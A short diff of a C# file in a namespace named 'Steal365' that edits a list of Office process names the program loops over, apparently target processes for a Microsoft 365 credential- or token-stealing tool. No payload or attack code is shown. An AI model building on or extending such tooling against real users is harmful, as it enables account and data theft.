@@ -97,7 +97,7 @@ namespace Steal365
 
         public static void Main()
         {
-            var procs = new List<string> { "WINWORD", "ONENOTE", "POWERPNT", "OUTLOOK", "EXCEL", "OneDrive" };
+            var procs = new List<string> { "WINWORD", "ONENOTEM", "POWERPNT", "OUTLOOK", "EXCEL", "OneDrive" };
 
             foreach (string p in procs)
             {
